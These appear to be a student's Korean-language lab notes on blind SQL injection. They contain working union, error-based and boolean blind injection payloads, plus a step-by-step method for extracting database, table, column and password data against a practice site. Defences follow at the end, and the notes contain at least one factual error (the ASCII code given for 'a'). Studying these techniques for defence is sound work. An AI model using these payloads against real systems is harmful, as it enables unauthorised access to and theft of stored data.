<?php
1’ union select column_name, 2 from information_schema.columns WHERE table_name = ‘admin’ #

1' and updatexml(null,concat(0x3a,(select database())),null) and ’1%’=‘1'



Blind SQL Injection / SQL 질의문 결과가 화면에 안나오는 곳

SQL Injection 가능한 모든 곳에 사용 가능
시간이 오래 걸림
자동화 능력이 있어야함 / python


원리
SQL 질의문의 결과가 참과 거짓에 따라 응답이 달라질 때

삽입하는 조건문

트릭
1. Limit [시작위치0], [개수]
	> 데이터가 하나의 행만 추출될 수 있도록 만들어주는 문법

   2. Substring [시작위치1], [개수]
	> 글자를 잘라낼 때 사용(함수)
	substring(‘normaltic’, 1, 1)=‘a’)

   3. ascii
	문자를 숫자로 표현한 코드
	ascii(‘a’) = 39

   4. 2진 탐색 / 업다운게임
	33 ~ 126
http://normaltic.com:7777/BlindSqli/login.php

————————————————————————————————
select pass from member where id=‘normaltic’



‘test’

순서?
1. substring(‘test’, 1, 1)
2. ascii(substring(‘test’, 1, )) > 0
3. ascii(substring((SQL), 1, 1)) > 0
  ascii(substring((select pass from member limit 0, 1), 1, 1)) > 0

‘ and (ascii(substring((select pass from member where id=‘normaltic’),1,1))>100) and ’1%’=‘1


Id > pajji%’ and (조건) and ’1%’=1

‘ and (1=1) and ‘1%’=‘1
‘ and (조건) and ‘1%’=‘1

select * from ~ where user_id like ‘%______%’

?>

step1. SQL 가능 유무 체크

  mario' and '1'='1 / mariosuper

  select ~~ where id='mario' and '1'='1'

step2. Payload 구성 (조건문)

  mario' and (1=2) and '1'='1

step3. database
ascii(substing((select database()), 1, 1))>70
mario' and (ascii(Substring((select database()), 1, 1))>70) and '1'='1



database: sqli_3

step4. table
select table_name from information_schema.tables Where table_schema = ‘DB’ limit 0, 1

mario' and (ascii(substring((select table_name from information_schema.tables where table_schema = ‘sqli_3’ limit 0, 1), 1, 1))>70) and '1'='1

table:

step5. column
mario' and (ascii(substring((select column_name from information_schema.columns Where table_name = ‘Table’ limit 0, 1), 1, 1))>70) and '1'='1


step6. data

python으로 자동화 프로그램 코딩 해보자....!

SQL Injection 훈련
> lord of SQL Injection

- SQL Injection 대응 방안.
  1. Prepared Statement
    미리 컴파일 해버림 / 변수화 / SQL Injection 원천차단
    select * from member where id='__' and pass='__'
    > 01010100101010___0101010101010__10101001001
  - 단, Prepared Statement 가 적용이 안되는 곳이 있으니.
  그 곳은 화이트 리스트 기반 필터링을 한다.

  2. 필터링 or WAF(web application Firewall) 도입
  가) 화이트 리스트 기반 필터링
  나) 블랙 리스트 기반 필터링

- 왜 SQL이 먹힐까?
  1. 옛날에 만든 사이트, 옛날 사람들.
  2. Prepared Statement를 제대로 못쓴다.
  3. Prepared Statement 적용이 안되는 곳 : order by, table 이름, column 이름

4주차 과제
1. 웹개발
2. SQLi 공격 연구 보고서 마무리
3. SQLi 3 문제 풀기!











.
...
.
.
.
.
.
.
.
.
.
.
.
.
..
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
..
.
